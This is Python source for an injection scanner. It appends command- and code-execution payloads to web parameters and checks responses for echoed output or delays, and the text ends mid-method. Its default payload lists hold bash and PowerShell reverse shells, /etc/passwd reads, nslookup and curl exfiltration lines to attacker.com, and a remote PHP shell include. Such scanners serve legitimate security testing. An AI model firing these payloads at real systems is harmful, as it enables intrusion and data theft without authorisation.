import time
import requests
import hashlib
import logging
import sys
import os
import re
import json
import urllib.parse
from urllib.parse import quote, unquote, urlparse, parse_qs, urljoin, urlunparse, urlencode
from bs4 import BeautifulSoup

# 导入模块
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from modules.request_manager import RateLimiter
    from modules.request_queue import RequestQueueManager
    from modules.request_sender import RequestSender
    from modules.request_builder import RequestBuilder
    from modules.response_parse import ResponseParse
    from utils import load_config, load_command_config, load_code_exec_config, print_colored
    
    print("✅ CommandCodeScanner 所有模块导入成功")
except ImportError as e:
    print(f"❌ 导入模块失败: {e}")
    print("请确保以下模块存在：")
    print("1. modules/request_manager.py")
    print("2. modules/request_queue.py")
    print("3. modules/request_sender.py")
    print("4. modules/request_builder.py")
    print("5. modules/response_parse.py")
    print("6. utils.py")
    sys.exit(1)

class CommandCodeScanner:
    def __init__(self, config=None):
        self.config = config or load_config()
        self.session = requests.Session()
        # 禁用所有代理（包括环境变量中的代理）
        self.session.trust_env = False
        self.session.proxies = {
            'http': None,
            'https': None,
            'all': None
        }
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; rv:109.0) Gecko/20100101 Firefox/115.0"
        })
        
        # 获取日志记录器
        self.logger = logging.getLogger('vuln_scanner.command_code')
        
        # 加载payload配置
        print("📋 开始加载Payload配置...")
        
        # 尝试从外部配置加载，失败则使用内置默认配置
        try:
            loaded_cmd_config = load_command_config()
            if loaded_cmd_config and 'payloads' in loaded_cmd_config:
                self.cmd_config = loaded_cmd_config
                print(f"✅ 命令执行Payload加载成功: {len(self.cmd_config.get('payloads', {}))} 个类别")
            else:
                raise ValueError("外部配置为空，使用默认配置")
        except Exception as e:
            print(f"⚠️  命令执行Payload加载失败: {e}，使用内置默认配置")
            self.cmd_config = self._get_default_cmd_config()
            print(f"✅ 使用默认配置: {len(self.cmd_config.get('payloads', {}))} 个类别")
        
        try:
            loaded_code_config = load_code_exec_config()
            if loaded_code_config and 'payloads' in loaded_code_config:
                self.code_config = loaded_code_config
                print(f"✅ 代码执行Payload加载成功: {len(self.code_config.get('payloads', {}))} 个类别")
            else:
                raise ValueError("外部配置为空，使用默认配置")
        except Exception as e:
            print(f"⚠️  代码执行Payload加载失败: {e}，使用内置默认配置")
            self.code_config = self._get_default_code_config()
            print(f"✅ 使用默认配置: {len(self.code_config.get('payloads', {}))} 个类别")
        
        
        # 初始化速率限制器
        self.rate_limiter = RateLimiter(
            max_requests_per_second=self.config.get("max_requests_per_second", 20),
            max_requests_per_minute=self.config.get("max_requests_per_minute", 600)
        )
        
        # 初始化请求队列（降低并发避免堆积）
        self.request_queue = RequestQueueManager(
            max_concurrent=self.config.get("max_concurrent_requests", 3),  # 从5降低到3
            max_queue_size=self.config.get("max_queue_size", 50),  # 队列大小从100降低到50
            rate_limiter=self.rate_limiter
        )
        
        # 初始化请求发送器（禁用代理以直接连接目标，增加超时时间）
        self.request_sender = RequestSender(
            timeout=self.config.get("request_timeout", 30),  # 从10秒增加到30秒
            verify_ssl=self.config.get("verify_ssl", False),
            user_agent=self.config.get("user_agent"),
            proxies=None,  # 禁用代理，直接连接目标网站
            max_retries=self.config.get("max_retries", 2)  # 减少重试次数避免堆积
        )

        # 初始化请求构造器和响应解析器
        self.request_builder = RequestBuilder()
        self.response_parser = ResponseParse()

        # 构建payload集合
        self.command_payloads = self._build_command_payloads()
        self.code_payloads = self._build_code_payloads()
        
        # 检测指示器
        self.command_indicators = self._get_command_indicators()
        self.code_indicators = self._get_code_indicators()
        
        # 时间延迟阈值
        self.time_delay_threshold = self.config.get("time_delay_threshold", 3.0)
        
        # 结果存储
        self.results = {
            "requests": [],
            "responses": [],
            "statistics": {},
            'vulnerabilities': [],
            'command_statistics': {
                "total_tested": 0,
                "vulnerable_urls": 0,
                "by_type": {},
                "by_os": {},
                "by_method": {}
            },
            'code_statistics': {
                "total_tested": 0,
                "vulnerable_urls": 0,
                "by_language": {},
                "by_type": {},
                "by_method": {}
            }
        }
        
        # 存储正常响应基准（用于对比）
        self.baseline_responses = {}

    def _get_default_cmd_config(self):
        """默认命令执行配置"""
        return {
            "time_delay_threshold": 3.0,
            "payloads": {
                "unix_generic": {
                    "echo_based": ["; echo COMMAND_TEST", "| echo COMMAND_TEST", "& echo COMMAND_TEST"],
                    "time_based": ["; sleep 3", "| sleep 3", "& sleep 3"],
                    "reverse_shell": ["; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"],
                    "file_operations": ["; cat /etc/passwd", "| ls -la", "& whoami"]
                },
                "windows_generic": {
                    "echo_based": ["& echo COMMAND_TEST", "| echo COMMAND_TEST", "&& echo COMMAND_TEST"],
                    "time_based": ["& timeout 3", "| ping -n 3 127.0.0.1"],
                    "reverse_shell": ["& powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""],
                    "file_operations": ["& type C:\\Windows\\win.ini", "| dir", "&& ipconfig"]
                },
                "blind_detection": {
                    "dns_exfiltration": ["; nslookup $(whoami).attacker.com", "& nslookup %USERNAME%.attacker.com"],
                    "http_exfiltration": ["; curl http://attacker.com/$(whoami)", "& powershell -c \"Invoke-WebRequest -Uri http://attacker.com/$env:USERNAME\""]
                }
            },
            "indicators": {
                "unix_output": ["COMMAND_TEST", "root:", "bin/bash", "/home/", "uid=", "gid=", "groups="],
                "windows_output": ["COMMAND_TEST", "Windows", "Administrator", "C:\\\\", "Volume in drive", "Directory of"],
                "error_indicators": ["sh:", "bash:", "cmd.exe", "powershell", "command not found", "is not recognized"],
                "time_based_confirm": ["sleep:", "timeout:", "ping statistics"]
            }
        }

    def _get_default_code_config(self):
        """默认代码执行配置"""
        return {
            "payloads": {
                "php_generic": {
                    "eval_based": ["; echo 'CODE_TEST';", "'; system('whoami'); //", "\"; system('whoami'); //"],
                    "system_based": ["; system('echo CODE_TEST');", "'; exec('whoami'); //"],
                    "file_include": ["; include('http://attacker.com/shell.php');", "'; require_once('shell.php'); //"],
                    "assert_based": ["'; assert('system(\"whoami\")'); //", "\"; assert(\"system('whoami')\"); //"]
                },
                "python_generic": {
                    "eval_based": ["'; exec('print(\"CODE_TEST\")') #", "\"; exec('import os; os.system(\"whoami\")') #"],
                    "os_system": ["'; __import__('os').system('echo CODE_TEST') #", "\"; os.system('whoami') #"],
                    "pickle_rce": ["'; pickle.loads(b'cos\\nsystem\\n(S'whoami'\\ntR.') #"],
                    "template_injection": ["{{config}}", "${7*7}", "<%= 7*7 %>"]
                },
                "java_generic": {
                    "runtime_exec": ["'; Runtime.getRuntime().exec(\"echo CODE_TEST\"); //"],
                    "process_builder": ["'; new ProcessBuilder(\"whoami\").start(); //"],
                    "el_injection": ["${7*7}", "#{7*7}", "@{7*7}"]
                },
                "nodejs_generic": {
                    "eval_based": ["'; eval('console.log(\"CODE_TEST\")') //", "\"; eval(\"require('child_process').exec('whoami')\") //"],
                    "child_process": ["'; require('child_process').exec('echo CODE_TEST') //"],
                    "template_injection": ["${7*7}", "<%= 7*7 %>", "{{7*7}}"]
                },
                "blind_detection": {
                    "time_based": ["; sleep(3)", "'; sleep(3) //", "\"; sleep(3) //"],
                    "dns_exfiltration": ["'; system('nslookup $(whoami).attacker.com') //"],
                    "conditional_output": ["'; echo md5('test'); //", "\"; print(md5('test')); #"]
                }
            },
            "indicators": {
                "php_output": ["CODE_TEST", "PHP Version", "PHP License", "System ", "Build Date"],
                "python_output": ["CODE_TEST", "Python", "__main__", "<module>", "os.system"],
                "java_output": ["CODE_TEST", "java.", "Runtime", "ProcessBuilder", "NullPointerException"],
                "nodejs_output": ["CODE_TEST", "child_process", "require(", "console.log", "Error:"],
                "error_indicators": ["PHP Parse error", "SyntaxError", "NameError", "TypeError", "Exception"],
                "template_indicators": ["49", "7777777", "config", "SECRET_KEY", "DATABASE_URL"]
            }
        }

    def _build_command_payloads(self):
        """构建命令执行payload集合"""
        payloads = {
            "unix_echo": [],
            "windows_echo": [],
            "unix_time": [],
            "windows_time": [],
            "unix_file": [],
            "windows_file": [],
            "reverse_shell": [],
            "blind_dns": [],
            "blind_http": [],
            "conditional": []
        }
        
        config_payloads = self.cmd_config.get("payloads", {})
        
        # Unix payloads
        if "unix_generic" in config_payloads:
            unix = config_payloads["unix_generic"]
            
            if "echo_based" in unix:
                for payload in unix["echo_based"]:
                    payloads["unix_echo"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "echo",
                        "separator": self._detect_separator(payload)
                    })
            
            if "time_based" in unix:
                for payload in unix["time_based"]:
                    payloads["unix_time"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "time",
                        "separator": self._detect_separator(payload)
                    })
            
            if "file_operations" in unix:
                for payload in unix["file_operations"]:
                    payloads["unix_file"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "file",
                        "separator": self._detect_separator(payload)
                    })
            
            if "reverse_shell" in unix:
                for payload in unix["reverse_shell"]:
                    payloads["reverse_shell"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "reverse",
                        "separator": self._detect_separator(payload)
                    })
        
        # Windows payloads
        if "windows_generic" in config_payloads:
            windows = config_payloads["windows_generic"]
            
            if "echo_based" in windows:
                for payload in windows["echo_based"]:
                    payloads["windows_echo"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "echo",
                        "separator": self._detect_separator(payload)
                    })
            
            if "time_based" in windows:
                for payload in windows["time_based"]:
                    payloads["windows_time"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "time",
                        "separator": self._detect_separator(payload)
                    })
            
            if "file_operations" in windows:
                for payload in windows["file_operations"]:
                    payloads["windows_file"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "file",
                        "separator": self._detect_separator(payload)
                    })
            
            if "reverse_shell" in windows:
                for payload in windows["reverse_shell"]:
                    payloads["reverse_shell"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "reverse",
                        "separator": self._detect_separator(payload)
                    })
        
        # 盲注检测payloads
        if "blind_detection" in config_payloads:
            blind = config_payloads["blind_detection"]
            
            if "dns_exfiltration" in blind:
                for payload in blind["dns_exfiltration"]:
                    payloads["blind_dns"].append({
                        "payload": payload,
                        "os": "both",
                        "type": "blind_dns",
                        "separator": self._detect_separator(payload)
                    })
            
            if "http_exfiltration" in blind:
                for payload in blind["http_exfiltration"]:
                    payloads["blind_http"].append({
                        "payload": payload,
                        "os": "both",
                        "type": "blind_http",
                        "separator": self._detect_separator(payload)
                    })
        
        # 条件payloads（用于验证）
        conditional_payloads = [
            {"payload": "; echo 'COMMAND_TEST' && echo 'VERIFIED'", "os": "unix", "type": "conditional", "separator": ";"},
            {"payload": "& echo COMMAND_TEST && echo VERIFIED", "os": "windows", "type": "conditional", "separator": "&"},
            {"payload": "| echo COMMAND_TEST | echo VERIFIED", "os": "both", "type": "conditional", "separator": "|"}
        ]
        payloads["conditional"].extend(conditional_payloads)
        
        # 输出统计信息
        for payload_type, payload_list in payloads.items():
            if payload_list:
                print(f"📦 加载 {payload_type} payload: {len(payload_list)} 个")
        
        return payloads

    def _build_code_payloads(self):
        """构建代码执行payload集合"""
        payloads = {
            "php_direct": [],
            "php_system": [],
            "php_include": [],
            "php_assert": [],
            "python_eval": [],
            "python_os": [],
            "python_template": [],
            "java_runtime": [],
            "java_template": [],
            "nodejs_eval": [],
            "nodejs_child": [],
            "nodejs_template": [],
            "blind_time": [],
            "blind_conditional": [],
            "generic_template": []
        }
        
        config_payloads = self.code_config.get("payloads", {})
        
        # PHP payloads
        if "php_generic" in config_payloads:
            php = config_payloads["php_generic"]
            
            if "eval_based" in php:
                for payload in php["eval_based"]:
                    payloads["php_direct"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "eval",
                        "context": self._detect_context(payload)
                    })
            
            if "system_based" in php:
                for payload in php["system_based"]:
                    payloads["php_system"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "system",
                        "context": self._detect_context(payload)
                    })
            
            if "file_include" in php:
                for payload in php["file_include"]:
                    payloads["php_include"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "include",
                        "context": self._detect_context(payload)
                    })
            
            if "assert_based" in php:
                for payload in php["assert_based"]:
                    payloads["php_assert"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "assert",
                        "context": self._detect_context(payload)
                    })
        
        # Python payloads
        if "python_generic" in config_payloads:
            python = config_payloads["python_generic"]
            
            if "eval_based" in python:
                for payload in python["eval_based"]:
                    payloads["python_eval"].append({
                        "payload": payload,
                        "language": "python",
                        "type": "eval",
                        "context": self._detect_context(payload)
                    })
            
            if "os_system" in python:
                for payload in python["os_system"]:
                    payloads["python_os"].append({
                        "payload": payload,
                        "language": "python",
                        "type": "os_system",
                        "context": self._detect_context(payload)
                    })
            
            if "template_injection" in python:
                for payload in python["template_injection"]:
                    payloads["python_template"].append({
                        "payload": payload,
                        "language": "python",
                        "type": "template",
                        "context": self._detect_context(payload)
                    })
        
        # Java payloads
        if "java_generic" in config_payloads:
            java = config_payloads["java_generic"]
            
            if "runtime_exec" in java:
                for payload in java["runtime_exec"]:
                    payloads["java_runtime"].append({
                        "payload": payload,
                        "language": "java",
                        "type": "runtime",
                        "context": self._detect_context(payload)
                    })
            
            if "el_injection" in java:
                for payload in java["el_injection"]:
                    payloads["java_template"].append({
                        "payload": payload,
                        "language": "java",
                        "type": "template",
                        "context": self._detect_context(payload)
                    })
        
        # Node.js payloads
        if "nodejs_generic" in config_payloads:
            nodejs = config_payloads["nodejs_generic"]
            
            if "eval_based" in nodejs:
                for payload in nodejs["eval_based"]:
                    payloads["nodejs_eval"].append({
                        "payload": payload,
                        "language": "nodejs",
                        "type": "eval",
                        "context": self._detect_context(payload)
                    })
            
            if "child_process" in nodejs:
                for payload in nodejs["child_process"]:
                    payloads["nodejs_child"].append({
                        "payload": payload,
                        "language": "nodejs",
                        "type": "child_process",
                        "context": self._detect_context(payload)
                    })
            
            if "template_injection" in nodejs:
                for payload in nodejs["template_injection"]:
                    payloads["nodejs_template"].append({
                        "payload": payload,
                        "language": "nodejs",
                        "type": "template",
                        "context": self._detect_context(payload)
                    })
        
        # 盲注检测payloads
        if "blind_detection" in config_payloads:
            blind = config_payloads["blind_detection"]
            
            if "time_based" in blind:
                for payload in blind["time_based"]:
                    payloads["blind_time"].append({
                        "payload": payload,
                        "language": "generic",
                        "type": "time",
                        "context": self._detect_context(payload)
                    })
            
            if "conditional_output" in blind:
                for payload in blind["conditional_output"]:
                    payloads["blind_conditional"].append({
                        "payload": payload,
                        "language": "generic",
                        "type": "conditional",
                        "context": self._detect_context(payload)
                    })
        
        # 通用模板注入payloads
        generic_template = [
            {"payload": "${7*7}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "#{7*7}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "@{7*7}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "{{7*7}}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "<%= 7*7 %>", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "${T(java.lang.Runtime).getRuntime().exec('calc')}", "language": "java", "type": "template", "context": "injection"}
        ]
        payloads["generic_template"].extend(generic_template)
        
        # 输出统计信息
        for payload_type, payload_list in payloads.items():
            if payload_list:
                print(f"📦 加载 {payload_type} payload: {len(payload_list)} 个")
        
        return payloads

    def _get_command_indicators(self):
        """获取命令执行检测指示器"""
        indicators = self.cmd_config.get("indicators", {})
        
        # 添加默认指示器
        default_indicators = {
            "unix_output": ["COMMAND_TEST", "root:", "bin/bash", "/home/", "uid=", "gid=", "groups="],
            "windows_output": ["COMMAND_TEST", "Windows", "Administrator", "C:\\\\", "Volume in drive", "Directory of"],
            "error_indicators": ["sh:", "bash:", "cmd.exe", "powershell", "command not found", "is not recognized"],
            "time_based_confirm": ["sleep:", "timeout:", "ping statistics"]
        }
        
        # 合并配置和默认指示器
        for key, value in default_indicators.items():
            if key not in indicators:
                indicators[key] = value
        
        return indicators

    def _get_code_indicators(self):
        """获取代码执行检测指示器"""
        indicators = self.code_config.get("indicators", {})
        
        # 添加默认指示器
        default_indicators = {
            "php_output": ["CODE_TEST", "PHP Version", "PHP License", "System ", "Build Date"],
            "python_output": ["CODE_TEST", "Python", "__main__", "<module>", "os.system"],
            "java_output": ["CODE_TEST", "java.", "Runtime", "ProcessBuilder", "NullPointerException"],
            "nodejs_output": ["CODE_TEST", "child_process", "require(", "console.log", "Error:"],
            "error_indicators": ["PHP Parse error", "SyntaxError", "NameError", "TypeError", "Exception"],
            "template_indicators": ["49", "7777777", "config", "SECRET_KEY", "DATABASE_URL"]
        }
        
        # 合并配置和默认指示器
        for key, value in default_indicators.items():
            if key not in indicators:
                indicators[key] = value
        
        return indicators

    def _detect_separator(self, payload):
        """检测payload中的命令分隔符"""
        if ";" in payload:
            return ";"
        elif "&" in payload:
            return "&"
        elif "|" in payload:
            return "|"
        elif "&&" in payload:
            return "&&"
        elif "||" in payload:
            return "||"
        elif "`" in payload:
            return "`"
        elif "$(" in payload:
            return "$()"
        else:
            return "direct"

    def _detect_context(self, payload):
        """检测payload的上下文类型"""
        if "'" in payload and '"' in payload:
            return "mixed"
        elif "'" in payload:
            return "single_quote"
        elif '"' in payload:
            return "double_quote"
        elif ";" in payload:
            return "semicolon"
        else:
            return "direct"

    def parse_cookies(self, cookies_input):
        """
        将cookies字符串转换为字典
        """
        if not cookies_input:
            return {}

        if isinstance(cookies_input, dict):
            return cookies_input.copy()

        if isinstance(cookies_input, str):
            cookies_input = cookies_input.strip()
            
            if cookies_input.startswith('{') and cookies_input.endswith('}'):
                try:
                    return json.loads(cookies_input)
                except json.JSONDecodeError:
                    pass
            
            cookies_dict = {}
            if cookies_input.lower().startswith('cookie:'):
                cookies_input = cookies_input[7:].strip()

            pairs = cookies_input.split(';')
            for pair in pairs:
                pair = pair.strip()
                if not pair:
                    continue
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    cookies_dict[key.strip()] = value.strip()
                else:
                    cookies_dict[pair] = ''
            return cookies_dict

        return {}

    def send_controlled_request(self, request_info):
        """发送受控制的请求"""
        cookies_str = self.config.get("cookies")
        cookies = self.parse_cookies(cookies_str)
        
        def _make_request():
            method = request_info.get('method', 'GET')
            url = request_info.get('url')

            if not url:
                raise ValueError("请求URL不能为空")

            response = self.request_sender.send_request(
                method=method,
                url=url,
                params=request_info.get('params'),
                data=request_info.get('data'),
                json_data=request_info.get('json'),
                headers=request_info.get('headers'),
                cookies=cookies,
                allow_redirects=request_info.get('allow_redirects', True)
            )

            response_text = response.text
            if not isinstance(response_text, str):
                if response_text is None:
                    response_text = ''
                else:
                    response_text = str(response_text)

            content_length = len(response.content) if hasattr(response, 'content') else 0

            parsed_response = {}
            if hasattr(self.response_parser, 'parse_response'):
                try:
                    parsed_response = self.response_parser.parse_response(
                        response,
                        extract_links=True,
                        extract_forms=True,
                        base_url=url
                    )
                except Exception as e:
                    print(f"解析响应时出错: {e}")
                    parsed_response = {}

            return {
                'request': request_info,
                'response': {
                    'status_code': response.status_code if hasattr(response, 'status_code') else 0,
                    'url': str(response.url) if hasattr(response, 'url') else url,
                    'headers': dict(response.headers) if hasattr(response, 'headers') else {},
                    'text': response_text,
                    'content': response_text,
                    'content_length': content_length
                },
                'parsed': parsed_response
            }

        task_id = f"req_{int(time.time() * 1000)}_{hash(str(request_info)) % 10000}"

        try:
            self.request_queue.submit(task_id, _make_request)
        except Exception as e:
            print(f"[ERROR] 提交任务失败: {e}")
            try:
                result = _make_request()
                self._record_request_result(result)
                return result
            except Exception as e2:
                print(f"[ERROR] 直接请求也失败: {e2}")
                return None

        try:
            result = self.request_queue.get_result(task_id, timeout=60)  # 从30秒增加到60秒
            self._record_request_result(result)
            return result
        except Exception as e:
            error_msg = f"请求失败: {request_info.get('url')} - {e}"
            if self.logger:
                self.logger.error(error_msg)
            else:
                print(error_msg)
            return None

    def _record_request_result(self, result):
        """记录请求结果"""
        if not result:
            return
        
        self.results['requests'].append(result['request'])
        self.results['responses'].append(result['response'])
        self._collect_statistics()

    def _collect_statistics(self):
        """收集统计信息"""
        self.results['statistics'] = {
            'request_stats': self.request_sender.get_statistics() if hasattr(self.request_sender, 'get_statistics') else {},
            'queue_stats': self.request_queue.get_statistics() if hasattr(self.request_queue, 'get_statistics') else {},
            'rate_limit_stats': self.rate_limiter.get_stats() if hasattr(self.rate_limiter, 'get_stats') else {},
            'scan_duration': f"{time.time():.2f}s"
        }

    def get_baseline_response(self, url, param_name, param_value, method, post_data):
        """获取基准响应"""
        baseline_key = f"{url}_{param_name}_{method}"

        if baseline_key in self.baseline_responses:
            return self.baseline_responses[baseline_key]

        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': {},
                'allow_redirects': True
            }

            if method.upper() == "GET":
                parsed_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = parsed_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                response_data = response['response']
                content = response_data.get('content', '')
                content_length = response_data.get('content_length', 0)
                status_code = response_data.get('status_code', 0)
                headers = response_data.get('headers', {})

                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                baseline = {
                    'content': content,
                    'length': content_length,
                    'status': status_code,
                    'time': 0,
                    'headers': headers,
                    'hash': hashlib.md5(content.encode()).hexdigest() if content else ''
                }

                self.baseline_responses[baseline_key] = baseline
                return baseline

        except Exception as e:
            print(f"获取基准响应失败: {e}")

        return None

    def _build_url_with_param(self, url, param_name, value):
        """构建带参数的URL"""
        if not isinstance(url, str):
            if isinstance(url, list):
                url = url[0] if url else ""
            else:
                url = str(url)

        if not url:
            return ""

        try:
            parsed = urlparse(url)#url拆解成6份
            query_dict = parse_qs(parsed.query)#转换为字典
            query_dict[param_name] = [value]#添加新的参数(查询字符串参数值是列表)

            new_query = urlencode(query_dict, doseq=True)#重新编码查询字符串(字典变查询字符串)
             #重新构建完整的URL
            return parsed._replace(query=new_query).geturl()
        except Exception as e:
            print(f"❌ 构建URL参数失败: {e}")
            if '?' in url:
                return f"{url}&{param_name}={value}"
            else:
                return f"{url}?{param_name}={value}"

    # ==================== 命令执行检测方法 ====================

    def detect_command_echo_based(self, url, param_name, param_value, method, post_data):
        """增强的基于回显的命令执行检测：多层验证 + 精准指示器识别"""
        vulnerabilities = []
        
        # 获取基准响应（用于对比）
        baseline = self.get_baseline_response(url, param_name, param_value, method, post_data)
        baseline_content = baseline.get('content', '') if baseline else ""
        
        # ==================== Unix 命令执行测试 ====================
        for payload_info in self.command_payloads.get("unix_echo", [])[:8]:
            payload = payload_info.get("payload", "")
            separator = payload_info.get("separator", "")
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if not response or 'response' not in response:
                    continue
                
                content = response['response'].get('content', '')
                if not isinstance(content, str):
                    content = str(content)
                
                # 第一层：检查是否与基准响应完全相同（说明没有命令执行）
                if content.strip() == baseline_content.strip():
                    continue
                
                # 第二层：精准指示器匹配
                unix_indicators = self.command_indicators.get("unix_output", [])
                matched_indicators = []
                
                for indicator in unix_indicators:
                    # 计算指示器在响应中出现的位置和频率
                    indicator_count = content.lower().count(indicator.lower())
                    if indicator_count > 0:
                        matched_indicators.append({
                            'indicator': indicator,
                            'count': indicator_count,
                            'confidence': 0.95 if indicator_count > 1 else 0.85  # 多次出现置信度更高
                        })
                
                if matched_indicators:
                    # 第三层：验证指示器的有效性（排除假阳性）
                    # 确保指示器是与命令输出相关的，而不仅仅是页面的静态内容
                    strong_indicators = [m for m in matched_indicators 
                                       if m['indicator'] in ['root:', 'uid=', 'gid=', 'groups=']]
                    
                    if strong_indicators or len(matched_indicators) >= 2:
                        confidence = "高" if strong_indicators else "中"
                        matched_str = ", ".join([m['indicator'] for m in matched_indicators[:3]])
                        
                        vulnerabilities.append({
                            'type': 'Command Injection (Echo-Based)',
                            'payload': payload,
                            'os': 'Unix/Linux',
                            'confidence': confidence,
                            'evidence': f"检测到命令输出指示器: {matched_str}",
                            'technique': 'Command output reflection',
                            'separator': separator,
                            'response_code': response['response'].get('status_code', 0),
                            'indicators_matched': [m['indicator'] for m in matched_indicators[:5]]
                        })
                        break  # 找到一个有效漏洞即停止
            
            except Exception as e:
                print(f"[DEBUG] Unix echo 测试异常: {e}")
                continue
        
        # ==================== Windows 命令执行测试 ====================
        for payload_info in self.command_payloads.get("windows_echo", [])[:8]:
            payload = payload_info.get("payload", "")
            separator = payload_info.get("separator", "")
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if not response or 'response' not in response:
                    continue
                
                content = response['response'].get('content', '')
                if not isinstance(content, str):
                    content = str(content)
                
                # 第一层：基准对比
                if content.strip() == baseline_content.strip():
                    continue
                
                # 第二层：Windows 指示器匹配
                windows_indicators = self.command_indicators.get("windows_output", [])
                matched_indicators = []
                
                for indicator in windows_indicators:
                    indicator_count = content.lower().count(indicator.lower())
                    if indicator_count > 0:
                        matched_indicators.append({
                            'indicator': indicator,
                            'count': indicator_count,
                            'confidence': 0.95 if indicator_count > 1 else 0.85
                        })
                
                if matched_indicators:
                    # 第三层：Windows 强指示器优先
                    strong_indicators = [m for m in matched_indicators 
                                       if m['indicator'] in ['Administrator', 'C:\\\\', 'System32']]
                    
                    if strong_indicators or len(matched_indicators) >= 2:
                        confidence = "高" if strong_indicators else "中"
                        matched_str = ", ".join([m['indicator'] for m in matched_indicators[:3]])
                        
                        vulnerabilities.append({
                            'type': 'Command Injection (Echo-Based)',
                            'payload': payload,
                            'os': 'Windows',
                            'confidence': confidence,
                            'evidence': f"检测到命令输出指示器: {matched_str}",
                            'technique': 'Command output reflection',
                            'separator': separator,
                            'response_code': response['response'].get('status_code', 0),
                            'indicators_matched': [m['indicator'] for m in matched_indicators[:5]]
                        })
                        break  # 找到一个有效漏洞即停止
            
            except Exception as e:
                print(f"[DEBUG] Windows echo 测试异常: {e}")
                continue
        
        return vulnerabilities

    def detect_command_time_based(self, url, param_name, param_value, method, post_data):
        """增强的基于时间的命令执行检测：自适应阈值 + 多次验证"""
        vulnerabilities = []
        
        # ==================== 动态阈值计算 ====================
        # 获取基准响应时间（多次测量以提高准确性）
        baseline_times = []
        for _ in range(3):
            t = self._measure_response_time(url, param_name, param_value, method, post_data)
            if t != float('inf'):
                baseline_times.append(t)
        
        if not baseline_times:
            return vulnerabilities
        
        normal_time = sum(baseline_times) / len(baseline_times)
        # 动态阈值：基准时间 + 3 秒，或基准时间的 3 倍（取较大值）
        adaptive_threshold = max(normal_time + 3.0, normal_time * 3.0)
        
        print(f"[DEBUG] 命令执行时间基准: {normal_time:.2f}s, 动态阈值: {adaptive_threshold:.2f}s")
        
        # ==================== Unix 时间盲注测试 ====================
        for payload_info in self.command_payloads.get("unix_time", [])[:5]:
            payload = payload_info.get("payload", "")
            separator = payload_info.get("separator", "")
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                # 发送延迟 payload
                response = self._send_command_test(url, param_name, test_value, method, post_data, 
                                                  timeout=int(adaptive_threshold) + 10)
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time > adaptive_threshold:
                    # 第二次验证：再测一次确保不是网络波动
                    start_time2 = time.time()
                    response2 = self._send_command_test(url, param_name, test_value, method, post_data,
                                                       timeout=int(adaptive_threshold) + 10)
                    elapsed_time2 = time.time() - start_time2
                    
                    if elapsed_time2 > adaptive_threshold:
                        vulnerabilities.append({
                            'type': 'Command Injection (Time-Based)',
                            'payload': payload,
                            'os': 'Unix/Linux',
                            'confidence': '高',  # 两次都超过阈值，置信度高
                            'evidence': {
                                'baseline_time': round(normal_time, 2),
                                'delayed_time_1': round(elapsed_time, 2),
                                'delayed_time_2': round(elapsed_time2, 2),
                                'threshold': round(adaptive_threshold, 2)
                            },
                            'technique': 'Time-based blind injection',
                            'separator': separator
                        })
                        break
            
            except Exception as e:
                if "timeout" in str(e).lower():
                    # 第二次验证：再测一次确认
                    try:
                        start_time2 = time.time()
                        self._send_command_test(url, param_name, test_value, method, post_data,
                                               timeout=int(adaptive_threshold) + 10)
                        elapsed_time2 = time.time() - start_time2
                        
                        if elapsed_time2 > adaptive_threshold or "timeout" in str(e).lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (Time-Based - Confirmed Timeout)',
                                'payload': payload,
                                'os': 'Unix/Linux',
                                'confidence': '高',
                                'evidence': f'请求超时（多次确认），说明命令执行成功',
                                'technique': 'Time-based blind injection (timeout)',
                                'separator': separator
                            })
                            break
                    except:
                        pass
                continue
        
        # ==================== Windows 时间盲注测试 ====================
        for payload_info in self.command_payloads.get("windows_time", [])[:5]:
            payload = payload_info.get("payload", "")
            separator = payload_info.get("separator", "")
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                response = self._send_command_test(url, param_name, test_value, method, post_data,
                                                  timeout=int(adaptive_threshold) + 10)
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time > adaptive_threshold:
                    # 第二次验证
                    start_time2 = time.time()
                    response2 = self._send_command_test(url, param_name, test_value, method, post_data,
                                                       timeout=int(adaptive_threshold) + 10)
                    elapsed_time2 = time.time() - start_time2
                    
                    if elapsed_time2 > adaptive_threshold:
